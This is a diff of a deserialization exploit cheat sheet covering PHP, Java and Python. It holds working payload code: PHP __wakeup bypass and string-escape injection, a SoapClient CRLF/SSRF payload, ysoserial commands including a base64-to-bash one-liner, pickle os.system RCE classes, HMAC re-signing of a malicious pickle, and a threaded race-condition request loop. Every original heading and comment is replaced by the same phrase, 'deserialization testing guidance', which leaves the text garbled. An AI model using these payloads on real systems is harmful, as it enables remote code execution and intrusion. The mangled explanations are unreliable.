@@ -1,30 +1,30 @@
-# 反序列化利用链手册
+# deserialization testing guidance
 
-## PHP 反序列化
+## PHP deserialization testing guidance
 
-### 基础概念
+### deserialization testing guidance
 ```php
-// 序列化
+// deserialization testing guidance
 $s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}
 
-// 反序列化
+// deserialization testing guidance
 $obj = unserialize($s);
 
-// 魔术方法触发链
+// deserialization testing guidance
 __construct() → __wakeup() → __destruct()
 __toString() → __call() → __get()
 ```
 
-### 常见利用链
+### deserialization testing guidance
 
-#### 1. __wakeup 绕过（CVE-2017-12944 / PHP < 7.4）
+#### 1. __wakeup deserialization testing guidance（CVE-2017-12944 / PHP < 7.4）
 ```php
-// 当属性数大于实际属性数时，__wakeup 不执行
-O:4:"User":2:{...}   // 正常
-O:4:"User":3:{...}   // 绕过 __wakeup（属性数 3 > 实际 2）
+// deserialization testing guidance，__wakeup deserialization testing guidance
+O:4:"User":2:{...}   // deserialization testing guidance
+O:4:"User":3:{...}   // deserialization testing guidance __wakeup（deserialization testing guidance 3 > deserialization testing guidance 2）
 ```
 
-#### 2. __toString 触发
+#### 2. __toString deserialization testing guidance
 ```php
 class FileViewer {
     public $filename;
@@ -32,10 +32,10 @@ class FileViewer {
         return file_get_contents($this->filename);
     }
 }
-// 构造: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
+// deserialization testing guidance: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
 ```
 
-#### 3. SoapClient CRLF 注入 (SSRF)
+#### 3. SoapClient CRLF deserialization testing guidance (SSRF)
 ```php
 $target = "http://internal-service/";
 $client = new SoapClient(null, array(
@@ -43,37 +43,37 @@ $client = new SoapClient(null, array(
     'location' => $target,
     'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
 ));
-// 序列化后触发 SSRF + CRLF 头注入
+// deserialization testing guidance SSRF + CRLF deserialization testing guidance
 echo urlencode(serialize($client));
 ```
 
-#### 4. PHP 序列化长度操纵
+#### 4. PHP deserialization testing guidance
 ```
-// 利用字符串变长差异
-// s:5:"admin" (5 字节) vs s:5:"admin" (可能被修改后长度不一致)
-// 通过改变序列化字符串的长度值来截断或注入
-```
-
-### PHP 反序列化字符串逃逸
-
-**增逃逸**（过滤后变长）：
-```
-// 过滤: "x" → "xx"（1→2，每处多1字节）
-// 注入: 在可控属性中填入 ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
-// 计算需要几个 "x" 来补足长度差
+// deserialization testing guidance
+// s:5:"admin" (5 deserialization testing guidance) vs s:5:"admin" (deserialization testing guidance)
+// deserialization testing guidance
 ```
 
-**减逃逸**（过滤后变短）：
+### PHP deserialization testing guidance
+
+**deserialization testing guidance**（deserialization testing guidance）：
 ```
-// 过滤: "xx" → "x"（2→1，每处少1字节）
-// 利用长度减少来吞掉后面的序列化字符串
+// deserialization testing guidance: "x" → "xx"（1→2，deserialization testing guidance1deserialization testing guidance）
+// deserialization testing guidance: deserialization testing guidance ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
+// deserialization testing guidance "x" deserialization testing guidance
 ```
 
-## Java 反序列化
+**deserialization testing guidance**（deserialization testing guidance）：
+```
+// deserialization testing guidance: "xx" → "x"（2→1，deserialization testing guidance1deserialization testing guidance）
+// deserialization testing guidance
+```
 
-### 常见 Gadgets
+## Java deserialization testing guidance
 
-| Gadget 链 | 影响组件 | 命令执行 |
+### deserialization testing guidance Gadgets
+
+| Gadget deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
 |-----------|---------|---------|
 | CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
 | CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
@@ -82,24 +82,24 @@ echo urlencode(serialize($client));
 | JBossInvoker | JBoss | InvokerTransformer |
 | ROME | ROME | ObjectInstantiator |
 
-### 检测方法
+### deserialization testing guidance
 ```
-# 检查常见端口/路径
+# deserialization testing guidance/deserialization testing guidance
 /invoker/readonly
 /jmx-console/
 /web-console/
 /jbossws/
 ```
 
-### ysoserial 常用 payload
+### ysoserial deserialization testing guidance payload
 ```bash
 java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
 java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
 ```
 
-## Python 反序列化
+## Python deserialization testing guidance
 
-### pickle 反序列化 RCE
+### pickle deserialization testing guidance RCE
 ```python
 import pickle
 import os
@@ -109,39 +109,39 @@ class Evil(object):
         return (os.system, ('id',))
 
 payload = pickle.dumps(Evil())
-# 发送 payload 到目标
+# deserialization testing guidance payload deserialization testing guidance
 ```
 
-### 签名绕过
+### deserialization testing guidance
 ```python
-# 如果目标使用 HMAC 签名
-# 1. 获取签名密钥（可能通过信息泄露）
-# 2. 构造恶意 pickle 并重新签名
+# deserialization testing guidance HMAC deserialization testing guidance
+# 1. deserialization testing guidance（deserialization testing guidance）
+# 2. deserialization testing guidance pickle deserialization testing guidance
 import hmac, hashlib
 secret = b'secret_key'
 payload = pickle.dumps(Evil())
 signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
 ```
 
-### __reduce__ 替代方案
+### __reduce__ deserialization testing guidance
 ```python
-# 使用 __setstate__
+# deserialization testing guidance __setstate__
 class Evil:
     def __setstate__(self, state):
         os.system('id')
 ```
 
-## 竞态条件利用
+## deserialization testing guidance
 
 ```python
 import requests
 import threading
 
 def exploit():
-    # 在反序列化与验证之间的时间窗口
+    # deserialization testing guidance
     r = requests.post(url, data=payload)
     
-# 并发发送
+# deserialization testing guidance
 threads = [threading.Thread(target=exploit) for _ in range(50)]
 for t in threads:
     t.start()
